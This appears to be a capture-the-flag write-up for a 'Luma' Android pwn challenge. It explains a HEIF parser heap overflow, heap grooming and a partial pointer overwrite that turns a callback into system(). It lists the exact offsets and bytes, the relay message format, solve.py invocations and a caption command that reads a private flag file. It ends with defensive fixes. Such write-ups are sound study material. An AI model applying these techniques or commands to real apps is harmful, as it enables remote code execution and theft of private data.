---
title: "Luma"
ctf: "CSCV2026 Finals"
date: 2026-10-18
category: "pwn"
difficulty: "hard"
points: "unknown"
flag_format: "challenge-specific"
author: "datnix"
status: "local exploit confirmed; official remote flag unresolved"
---

# Luma — detailed solution

## Executive summary

Luma accepts an encrypted kind-2 sticker message. The native sticker path
passes a HEIF file to MediaBridge.processSticker(path, caption). The HEIF
parser trusts an iloc extent that is larger than the declared 64x64 mask
plane. The resulting out-of-bounds copy reaches a callback stored in an
adjacent heap allocation.

libmediaworker.so places puts in that callback field. A two-byte little-endian
overwrite changes the callback from puts to system, so the attacker-controlled
caption becomes a shell command.

The intended Android/Scudo payload is:

~~~text
extent length:       0x1252
overwrite location:  mdat payload + 0x1250
bytes written:       b8 9d
~~~

The bytes are the low 16 bits 0x9db8 of the target system pointer. The
remaining pointer bytes are left intact, which avoids needing an absolute
ASLR address.

The complete implementation is solve.py.

## Important distinction: intended target and local emulator

There are two payload layouts because the local emulator and the challenge
target are different runtimes:

| Runtime | Payload strategy |
|---|---|
| Native arm64 Android with the challenge's Scudo/libc build | 0x1252 extent and low-16-bit puts-to-system overwrite |
| x86_64 emulator running arm64 through Native Bridge | dynamically discover translated libc addresses and write full pointers; local overwrite observed at mdat + 0x1440 |

The second row is a regression test only. It is not evidence that the queue
device uses the same allocator layout.

## Application and relay flow

The app contains this path:

~~~text
MediaServerService
    └─ receives kind 2
       └─ writes the attachment to app storage
          └─ MediaBridge.processSticker(path, caption)
~~~

The relay plaintext has this shape:

~~~text
kind:          1 byte
caption_len:   4-byte big-endian integer
payload_len:   4-byte big-endian integer
caption
HEIF payload
~~~

The outer message uses AES-GCM. The authenticated data is:

~~~text
lease | sender | recipient | message_id | created_ms
~~~

The HTTP request is authenticated separately with the lease-derived HMAC
headers. solve.py implements both layers and sends the payload as kind 2.

## Vulnerability

The crafted HEIF contains:

~~~text
ftyp
meta
  hdlr
  pitm
  iloc
  iinf/infe   (item type: mski)
  iprp
    ispe       (64 x 64)
    mskC       (8-bit mask)
mdat
  mask bytes
~~~

The declared image plane is only:

~~~text
64 x 64 x 1 = 0x1000 bytes
~~~

The iloc item extent is deliberately declared as 0x1252 bytes. The decoder
copies the extent without enforcing the plane-size boundary:

~~~text
0x1252 - 0x1000 = 0x252 bytes beyond the plane
~~~

The payload generator fills the extent with safe bytes and then patches the
last two bytes at the callback location.

## Heap layout

Before decoding, the native code grooms the allocator approximately as follows:

~~~text
for i = 0 .. 511:
    allocate 0x100f bytes

free even-indexed allocations

for each odd-indexed allocation:
    *(allocation + 0x230) = puts
~~~

The vulnerable mask allocation reuses the freed size class. The copy reaches
the callback in the adjacent live allocation. The host-side model in the
analysis backup reproduced the same relationship and reported the overwritten
callback slot.

The critical relationship on the Android target is:

~~~text
mask plane start + 0x1250 = callback field
~~~

Because the extent ends at +0x1251, exactly two callback bytes are overwritten.

## Partial pointer overwrite

The target's native libc has puts and system in the same library mapping. Their
upper pointer bytes are therefore identical. The crafted bytes are:

~~~text
system low 16 bits: 0x9db8
little endian:      b8 9d
~~~

After decoding, the callback is interpreted as system. Its argument is the
caption supplied in the encrypted message.

The default remote command in solve.py is:

~~~sh
log -t LumaFlag "$(cat /data/user/0/com.luma.chat/files/flag.txt)"
~~~

This reads the private flag file in the target process context and sends the
result to Android's log buffer.

## Why the relay acknowledgment is not the flag

The kind-2 response is only a media-processing acknowledgment. It does not
contain stdout from the command executed by system. Consequently, solve.py
solve can prove that the encrypted message was accepted, but cannot by itself
print the remote flag.

The flag needs a second authorized observation path, such as:

~~~sh
adb logcat -d -s LumaFlag:I
~~~

or a callback/exfiltration endpoint accepted by the challenge environment.
poll decrypts relay messages, but it cannot recover shell stdout that the
relay never transmitted.

## Reproduction on the local emulator

The local emulator is x86_64 and uses ARM64 Native Bridge. The local helper
discovers the translated libc mapping and builds full pointer values.

Install the screen-output regression APK:

~~~sh
adb uninstall com.luma.chat
adb install /tmp/luma-local-test-proofscreen.apk

adb shell run-as com.luma.chat mkdir -p files
printf '%s\n' 'LOCAL_TEST_FLAG{private_read_check}' |
  adb shell run-as com.luma.chat dd of=files/flag.txt >/dev/null
~~~

Run:

~~~sh
python3 solve.py adb-local
~~~

The native command writes the flag to proof.txt, and the modified local
activity displays that proof file on-screen. The terminal also receives:

~~~text
I/LumaFlag(...): LOCAL_TEST_FLAG{private_read_check}
I/LumaLocalTest(...): 0
~~~

The screen APK is only a visualization aid. The actual vulnerable operation
is still the native HEIF overwrite and callback invocation.

## Remote usage

Use the lease profile supplied by the challenge environment; do not invent
these values:

~~~sh
export LUMA_BASE='https://59.153.245.196:1337'
export LUMA_USER='sam'
export LUMA_LEASE='...'
export LUMA_AUTH='...'
export LUMA_E2E='...'
~~~

Build and send the Android/Scudo payload:

~~~sh
python3 solve.py solve --output ./luma-android.heif
~~~

Or send a prepared payload:

~~~sh
python3 solve.py send ./luma-android.heif \
  --caption 'log -t LumaFlag "$(cat /data/user/0/com.luma.chat/files/flag.txt)"'
~~~

Poll relay responses:

~~~sh
python3 solve.py poll
~~~

## What if the queue device does not behave like the local test?

That is expected if “local test” means the x86_64 emulator. The local
full-pointer path must not be sent to a native arm64 queue device.

If the queue device is a native arm64 Android build matching the challenge
artifacts, the intended solution is the fixed Android payload:

~~~text
0x1252 extent
0x1250 overwrite
0x9db8 low half of system
~~~

If the queue device uses a different libc, allocator, or application build,
the constants are not universal. The failure modes are:

1. The overflow stops before the callback.
2. The overwrite reaches a different field.
3. The callback offset is different.
4. The target's system low half is different.
5. The exploit executes, but its output is invisible because the relay
   returns no command stdout.

With authorized device access, the correct calibration procedure is:

1. Confirm the process architecture and loaded libc.
2. Confirm the 0x100f grooming allocations and the callback field at +0x230.
3. Determine the mask-to-callback offset for that allocator.
4. Read the target libc symbol offsets or derive the puts/system relationship
   for that exact build.
5. Use a harmless command such as a tagged log marker to distinguish “payload
   rejected” from “payload executed but output unavailable.”
6. Only then send the flag-read command through an authorized output path.

Without access to the queue device, there is no reliable way to distinguish
those cases from an empty acknowledgment alone.

## Intended-solution assessment

Based on the shipped native libraries, the HEIF generator, and the allocator
model, the most defensible intended solution is:

1. Craft the mski extent overflow.
2. Use the Android/Scudo 0x1252 layout.
3. Partially overwrite the groomed puts callback to system.
4. Put a shell command in the caption.
5. Exfiltrate the private file through the challenge's authorized observer.

The local 0x1440 full-pointer path and the on-screen APK are convenience
artifacts for proving the primitive on the available emulator. They are not
the likely organizer payload for a native arm64 queue device.

## Evidence and flag provenance

Confirmed locally:

~~~text
LOCAL_TEST_FLAG{private_read_check}
~~~

Evidence:

~~~text
LumaMedia: sticker decoded; dispatching preview completion
LumaFlag: LOCAL_TEST_FLAG{private_read_check}
LumaLocalTest: 0
~~~

This is a locally provisioned fixture flag and is marked:

~~~text
LOCAL_CONFIRMED
PROOF_CONFIRMED
~~~

The official organizer flag is not claimed because the real queue endpoint
and device were unavailable during validation.

## Defensive fix

The application should:

* reject iloc extents larger than the destination plane;
* use a maintained HEIF parser with strict bounds checks;
* avoid predictable function pointers in adjacent attacker-reachable
  allocations;
* never pass an attacker-controlled caption to system;
* remove test/debug activities from production builds; and
* treat native decoder failures as errors rather than continuing with
  partially decoded data.
